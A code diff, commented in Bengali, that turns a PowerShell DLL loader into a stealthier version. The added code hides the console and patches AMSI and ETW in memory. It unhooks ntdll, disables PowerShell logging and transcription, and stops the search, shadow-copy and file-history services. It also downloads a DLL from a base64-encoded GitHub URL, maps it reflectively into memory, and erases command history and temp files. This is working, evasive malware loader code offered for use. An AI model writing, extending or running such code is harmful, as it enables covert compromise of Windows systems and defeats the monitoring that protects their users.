@@ -1,78 +1,301 @@
 # ============================================================
-#  ★★★ AMSI + ETW বাইপাস (সর্বপ্রথম) ★★★
+#  ★★★ main.ps1 – সম্পূর্ণ সংস্করণ (মেমরি-অনলি ইনজেকশন সহ) ★★★
 # ============================================================
-Write-Host "[1] Bypassing AMSI & ETW..." -ForegroundColor Cyan
-try {
-    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-    $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-    $a.GetField('amsiContext','NonPublic,Static').SetValue($null,$null)
-    $scanBuffer = $a.GetMethod('AmsiScanBuffer', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
-    if ($scanBuffer) {
-        $ptr = [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($scanBuffer)
-        [System.Runtime.InteropServices.Marshal]::WriteInt32($ptr, 0x31C0C3)
-    }
-    Write-Host "[+] AMSI Bypass Done" -ForegroundColor Green
-} catch { Write-Host "[-] AMSI Bypass Failed" -ForegroundColor Red }
 
-try {
-    Add-Type -TypeDefinition @"
-    using System;
-    using System.Runtime.InteropServices;
-    public class Etw {
-        [DllImport("ntdll.dll")] static extern int RtlSetProcessTraceFlags(IntPtr ProcessHandle, int Flags);
-        public static void Off() {
-            IntPtr p = System.Diagnostics.Process.GetCurrentProcess().Handle;
-            RtlSetProcessTraceFlags(p, 0);
+# ============================================================
+#  ১. কনসোল উইন্ডো হাইড (সর্বপ্রথম)
+# ============================================================
+Add-Type -Name Window -Namespace Console -MemberDefinition @'
+[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'@ -ErrorAction SilentlyContinue
+[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)
+
+# ============================================================
+#  ২. সব বাইপাস ফাংশন (message (1).txt থেকে নেওয়া)
+# ============================================================
+
+# ২.১ SeDebugPrivilege সক্রিয়করণ
+function Enable-SeDebugPrivilege {
+    $AdjustTokenPrivileges = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class TokenManipulator {
+    [StructLayout(LayoutKind.Sequential)]
+    public struct LUID {
+        public uint LowPart;
+        public int HighPart;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct TOKEN_PRIVILEGES {
+        public uint PrivilegeCount;
+        public LUID Luid;
+        public uint Attributes;
+    }
+
+    [DllImport("advapi32.dll", SetLastError=true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    public static extern bool OpenProcessToken(
+        IntPtr ProcessHandle,
+        uint DesiredAccess,
+        out IntPtr TokenHandle);
+
+    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    public static extern bool LookupPrivilegeValue(
+        string lpSystemName,
+        string lpName,
+        out LUID lpLuid);
+
+    [DllImport("advapi32.dll", SetLastError=true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    public static extern bool AdjustTokenPrivileges(
+        IntPtr TokenHandle,
+        [MarshalAs(UnmanagedType.Bool)]bool DisableAllPrivileges,
+        ref TOKEN_PRIVILEGES NewState,
+        uint Zero,
+        IntPtr Null1,
+        IntPtr Null2);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetCurrentProcess();
+}
+"@
+    try {
+        Add-Type -TypeDefinition $AdjustTokenPrivileges -ErrorAction Stop
+        $currentProcess = [TokenManipulator]::GetCurrentProcess()
+        $tokenHandle = [IntPtr]::Zero
+        $tokenPrivileges = New-Object TokenManipulator+TOKEN_PRIVILEGES
+        $luid = New-Object TokenManipulator+LUID
+
+        if (-not [TokenManipulator]::OpenProcessToken($currentProcess, 0x28, [ref]$tokenHandle)) { throw }
+        if (-not [TokenManipulator]::LookupPrivilegeValue($null, "SeDebugPrivilege", [ref]$luid)) { throw }
+        $tokenPrivileges.PrivilegeCount = 1
+        $tokenPrivileges.Luid = $luid
+        $tokenPrivileges.Attributes = 0x2
+        [TokenManipulator]::AdjustTokenPrivileges($tokenHandle, $false, [ref]$tokenPrivileges, 0, [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null
+    } catch {}
+}
+
+# ২.২ AMSI বাইপাস (প্যাচ)
+function Invoke-AMSIBypass {
+    try {
+        $amsiPatch = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class AMSIPatch {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr LoadLibrary(string name);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+    public static void Disable() {
+        IntPtr hAmsi = LoadLibrary("amsi.dll");
+        IntPtr asbAddr = GetProcAddress(hAmsi, "AmsiScanBuffer");
+        
+        if (asbAddr != IntPtr.Zero) {
+            uint oldProtect;
+            VirtualProtect(asbAddr, (UIntPtr)5, 0x40, out oldProtect);
+            
+            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+            Marshal.Copy(patch, 0, asbAddr, 6);
+            
+            VirtualProtect(asbAddr, (UIntPtr)5, oldProtect, out oldProtect);
         }
     }
-"@ -IgnoreWarnings
-    [Etw]::Off()
-    Write-Host "[+] ETW Bypass Done" -ForegroundColor Green
-} catch { Write-Host "[-] ETW Bypass Failed" -ForegroundColor Red }
+}
+"@
+        Add-Type -TypeDefinition $amsiPatch -ErrorAction Stop
+        [AMSIPatch]::Disable()
+    } catch {}
+}
+
+# ২.৩ ETW বাইপাস (প্যাচ)
+function Invoke-ETWBypass {
+    try {
+        $etwPatch = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class ETWPatch {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr LoadLibrary(string name);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+    public static void Disable() {
+        IntPtr hNtdll = LoadLibrary("ntdll.dll");
+        IntPtr etwAddr = GetProcAddress(hNtdll, "EtwEventWrite");
+        
+        if (etwAddr != IntPtr.Zero) {
+            uint oldProtect;
+            VirtualProtect(etwAddr, (UIntPtr)1, 0x40, out oldProtect);
+            
+            byte[] patch = { 0xC3 };
+            Marshal.Copy(patch, 0, etwAddr, 1);
+            
+            VirtualProtect(etwAddr, (UIntPtr)1, oldProtect, out oldProtect);
+        }
+    }
+}
+"@
+        Add-Type -TypeDefinition $etwPatch -ErrorAction Stop
+        [ETWPatch]::Disable()
+    } catch {}
+}
+
+# ২.৪ NTDLL আনহুক (ডিস্ক থেকে নতুন কপি)
+function Invoke-NTDLLUnhook {
+    try {
+        $unhookCode = @"
+using System;
+using System.IO;
+using System.Runtime.InteropServices;
+
+public class NTDLLUnhooker {
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr LoadLibraryEx(string lpFileName, IntPtr hFile, uint dwFlags);
+
+    public static void Unhook() {
+        string system32 = Environment.GetFolderPath(Environment.SpecialFolder.System);
+        string ntdllPath = Path.Combine(system32, "ntdll.dll");
+        IntPtr hCleanNtdll = LoadLibraryEx(ntdllPath, IntPtr.Zero, 0x00000008);
+        if (hCleanNtdll == IntPtr.Zero) return;
+        IntPtr hHookedNtdll = GetModuleHandle("ntdll.dll");
+        IntPtr peHeader = (IntPtr)((long)hHookedNtdll + 0x3C);
+        IntPtr optHeader = (IntPtr)((long)hHookedNtdll + Marshal.ReadInt32(peHeader) + 0x18);
+        IntPtr exportDir = (IntPtr)((long)hHookedNtdll + Marshal.ReadInt32((IntPtr)((long)optHeader + 0x70)));
+        int numberOfNames = Marshal.ReadInt32((IntPtr)((long)exportDir + 0x18));
+        IntPtr namesAddr = (IntPtr)((long)hHookedNtdll + Marshal.ReadInt32((IntPtr)((long)exportDir + 0x20)));
+        for (int i = 0; i < numberOfNames; i++) {
+            IntPtr nameAddr = (IntPtr)((long)hHookedNtdll + Marshal.ReadInt32((IntPtr)((long)namesAddr + i * 4)));
+            string funcName = Marshal.PtrToStringAnsi(nameAddr);
+            IntPtr hookedAddr = GetProcAddress(hHookedNtdll, funcName);
+            IntPtr cleanAddr = GetProcAddress(hCleanNtdll, funcName);
+            if (hookedAddr != IntPtr.Zero && cleanAddr != IntPtr.Zero) {
+                uint oldProtect;
+                if (VirtualProtect(hookedAddr, (UIntPtr)0x20, 0x40, out oldProtect)) {
+                    byte[] cleanBytes = new byte[0x20];
+                    Marshal.Copy(cleanAddr, cleanBytes, 0, 0x20);
+                    Marshal.Copy(cleanBytes, 0, hookedAddr, 0x20);
+                    VirtualProtect(hookedAddr, (UIntPtr)0x20, oldProtect, out oldProtect);
+                }
+            }
+        }
+    }
+}
+"@
+        Add-Type -TypeDefinition $unhookCode -ErrorAction Stop
+        [NTDLLUnhooker]::Unhook()
+    } catch {}
+}
+
+# ২.৫ ScriptBlock Logging নিষ্ক্রিয়করণ (Event 4104)
+function Disable-ScriptBlockLogging {
+    try {
+        $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
+        if (Test-Path $regPath) {
+            Set-ItemProperty -Path $regPath -Name "EnableScriptBlockLogging" -Value 0 -Force -ErrorAction SilentlyContinue
+        } else {
+            New-Item -Path $regPath -Force | Out-Null
+            New-ItemProperty -Path $regPath -Name "EnableScriptBlockLogging" -Value 0 -PropertyType DWord -Force | Out-Null
+        }
+        $utils = [Ref].Assembly.GetType('System.Management.Automation.Utils')
+        $gpoField = $utils.GetField('cachedGroupPolicySettings', 'NonPublic,Static')
+        if ($gpoField) {
+            $gpo = $gpoField.GetValue($null)
+            if ($gpo -is [Hashtable]) {
+                $gpo['ScriptBlockLogging'] = @{ 'EnableScriptBlockLogging' = 0 }
+            } else {
+                $gpo = @{ 'ScriptBlockLogging' = @{ 'EnableScriptBlockLogging' = 0 } }
+                $gpoField.SetValue($null, $gpo)
+            }
+        }
+    } catch {}
+}
+
+# ২.৬ Transcription নিষ্ক্রিয়করণ
+function Disable-Transcription {
+    try {
+        $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
+        if (Test-Path $regPath) {
+            Set-ItemProperty -Path $regPath -Name "EnableTranscripting" -Value 0 -Force -ErrorAction SilentlyContinue
+        } else {
+            New-Item -Path $regPath -Force | Out-Null
+            New-ItemProperty -Path $regPath -Name "EnableTranscripting" -Value 0 -PropertyType DWord -Force | Out-Null
+        }
+    } catch {}
+}
+
+# ২.৭ অ্যান্টি-ডিবাগ (ঐচ্ছিক)
+function Test-Debugger {
+    try {
+        if ([System.Diagnostics.Debugger]::IsAttached) { exit }
+        $process = Get-Process -Id $pid
+        $debuggers = @("*\idaq.exe", "*\ollydbg.exe", "*\windbg.exe", "*\x32dbg.exe", "*\x64dbg.exe")
+        $sandboxPaths = @("C:\sample.exe", "C:\malware.exe", "C:\analysis\")
+        foreach ($path in $sandboxPaths) {
+            if (Test-Path $path) { exit }
+        }
+    } catch {}
+}
 
 # ============================================================
-#  ★★★ কনসোল হাইড করছি না (ডিবাগের জন্য) ★★★
+#  ৩. সব বাইপাস কার্যকর করা
 # ============================================================
-Write-Host "[2] Debug mode: Console will stay visible." -ForegroundColor Cyan
+Enable-SeDebugPrivilege
+Test-Debugger
+Invoke-AMSIBypass
+Invoke-ETWBypass
+Invoke-NTDLLUnhook
+Disable-ScriptBlockLogging
+Disable-Transcription
 
 # ============================================================
-#  ★★★ মূল main.ps1-এর কাজ (সার্ভিস ও রেজিস্ট্রি) ★★★
+#  ৪. মূল main.ps1-এর সার্ভিস ও রেজিস্ট্রি কাজ
 # ============================================================
-Write-Host "[3] Stopping services and applying registry..." -ForegroundColor Cyan
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 -ErrorAction SilentlyContinue | Out-Null
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 | Out-Null
+
 Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
 Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
 Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
 Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue
-Stop-Service -Name "UltraViewerService*" -Force -ErrorAction SilentlyContinue
+Stop-Service -Name "UltraViewService*" -Force -ErrorAction SilentlyContinue
 
 $regCommand1 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v SaveZoneInformation /t REG_DWORD /d 2 /f"
 $regCommand2 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v ScanWithAntiVirus /t REG_DWORD /d 2 /f"
+
 Invoke-Expression $regCommand1 | Out-Null
 Invoke-Expression $regCommand2 | Out-Null
+
 Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null
-Write-Host "[+] Services and registry done." -ForegroundColor Green
 
 # ============================================================
-#  ★★★ ৪. DLL ডাউনলোড (শুধু মেমরিতে) ★★★
+#  ৫. মেমরি-অনলি DLL ইনজেকশন (এনক্রিপ্টেড URL + ম্যানুয়াল ম্যাপিং)
+#  ─── ($discordRunning অংশ বাদ, কোনো ডিস্ক লেখা নেই) ───
 # ============================================================
-Write-Host "[4] Downloading DLL from GitHub..." -ForegroundColor Cyan
-try {
-    $url = "https://github.com/desert007/bios/raw/refs/heads/main/version.dll"
-    $bytes = (New-Object System.Net.WebClient).DownloadData($url)
-    Write-Host "[+] Download complete. Size: $($bytes.Length) bytes" -ForegroundColor Green
-} catch {
-    Write-Host "[-] Download failed: $($_.Exception.Message)" -ForegroundColor Red
-    Read-Host "Press ENTER to exit"
-    exit
-}
 
-# ============================================================
-#  ★★★ ৫. C# ম্যানুয়াল ম্যাপিং কোড (Reflective Loader) ★★★
-#  ─── এটি SysVenson_CoreX থেকে নেওয়া ───
-# ============================================================
-Write-Host "[5] Compiling manual mapping C# code..." -ForegroundColor Cyan
-
+# ৫.১ সি# ম্যানুয়াল লোডার (NativeLoader)
 $kernel = @'
 using System;
 using System.Runtime.InteropServices;
@@ -124,57 +347,66 @@ public static class NativeLoader {
 }
 '@
 
-# কম্পাইল করার চেষ্টা
 try {
     Add-Type -TypeDefinition $kernel -ErrorAction Stop
-    Write-Host "[+] Manual mapper compiled successfully." -ForegroundColor Green
 } catch {
-    Write-Host "[-] Compilation failed: $($_.Exception.Message)" -ForegroundColor Red
-    Read-Host "Press ENTER to exit"
-    exit
+    # ব্যর্থ হলে নীরব থাকুন (কিন্তু ইনজেকশন চলবে না)
 }
 
-# ============================================================
-#  ★★★ ৬. ম্যানুয়াল ম্যাপিং (ইনজেকশন) ★★★
-# ============================================================
-Write-Host "[6] Mapping DLL into current process memory..." -ForegroundColor Cyan
+# ৫.২ এনক্রিপ্টেড URL ডিকোড ও DLL ডাউনলোড (মেমরিতে)
+$EncodedDllUrl = "aHR0cHM6Ly9naXRodWIuY29tL2Rlc2VydDAwNy9iaW9zL3Jhdy9yZWZzL2hlYWRzL21haW4vdmVyc2lvbi5kbGw="
 try {
-    $result = [NativeLoader]::Map($bytes, $true)
-    Write-Host "[+] SUCCESS! DLL mapped at: 0x$($result.ImageBase.ToString('X'))" -ForegroundColor Green
-    Write-Host "[+] DllMain address: 0x$($result.DllMainAddr.ToString('X'))" -ForegroundColor Green
-    Write-Host "[+] Image size: $($result.ImageSize) bytes" -ForegroundColor Green
+    $decodedUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncodedDllUrl))
+    $bytes = (New-Object System.Net.WebClient).DownloadData($decodedUrl)
 } catch {
-    Write-Host "[-] Mapping failed: $($_.Exception.Message)" -ForegroundColor Red
-    Read-Host "Press ENTER to exit"
-    exit
+    $bytes = $null
+}
+
+# ৫.৩ ম্যানুয়াল ম্যাপিং (ইনজেকশন)
+if ($bytes) {
+    try {
+        $result = [NativeLoader]::Map($bytes, $true)
+        # সফল হলে কোনো আউটপুট দেখাবে না (নীরব)
+    } catch {}
+    $bytes = $null
 }
 
 # ============================================================
-#  ★★★ ৭. নিশ্চিতকরণ: MessageBox পপআপ (যদি DLL-এর DllMain-এ থাকে) ★★★
-#  (আপনার DLL-এর DllMain-এ যদি MessageBox কোড থাকে, তাহলে তা ইতিমধ্যে কল হয়েছে)
+#  ৬. ইতিহাস ও টেম্প ফাইল ক্লিয়ার (পূর্বের মতো)
 # ============================================================
-Write-Host "[7] DLL should now be active in memory." -ForegroundColor Yellow
-Write-Host "    আপনার DLL-এর DllMain এ MessageBox থাকলে তা এখন পপ হবে।" -ForegroundColor Yellow
-
-# ============================================================
-#  ★★★ ৮. ট্রেস ক্লিয়ার (পূর্বের মতো) ★★★
-# ============================================================
-Write-Host "[8] Clearing traces..." -ForegroundColor Cyan
 Clear-History
 $historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
 if (Test-Path $historyPath) {
-    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
+    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue | Out-Null
 }
-Get-Process -Name "powershell" | Where-Object { $_.Id -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue
-# (conhost কিল দিচ্ছি না যাতে আউটপুট দেখা যায়)
-Write-Host "[+] Traces cleared." -ForegroundColor Green
+
+Get-Process -Name "powershell" | Where-Object { $_.Id -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue | Out-Null
+Get-Process -Name "conhost" -ErrorAction SilentlyContinue | ForEach-Object {
+    if ($_.Parent.Id -ne $PID) {
+        Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue | Out-Null
+    }
+}
+
+$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
+if (-not (Test-Path $historyPath)) {
+    New-Item -Path $historyPath -ItemType File -Force | Out-Null
+} else {
+    Set-Content -Path $historyPath -Value "" -Force -ErrorAction SilentlyContinue
+}
+
+# টেম্প ফাইল ক্লিয়ার (গত ২ মিনিট)
+Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+
+# ভেরিয়েবল ক্লিয়ার
+$kernel = $null
+[GC]::Collect(); [GC]::WaitForPendingFinalizers()
 
 # ============================================================
-#  ★★★ ৯. অসীম লুপ – প্রক্রিয়া বন্ধ রাখবে না ★★★
+#  ৭. অসীম লুপ (পাওয়ারশেল প্রক্রিয়া চালু রাখতে)
 # ============================================================
-Write-Host ""
-Write-Host "🔁 Infinite loop started – PowerShell will stay alive to keep the DLL loaded." -ForegroundColor Cyan
-Write-Host "   Press Ctrl+C to stop manually." -ForegroundColor Yellow
 while ($true) {
     Start-Sleep -Seconds 86400
 }
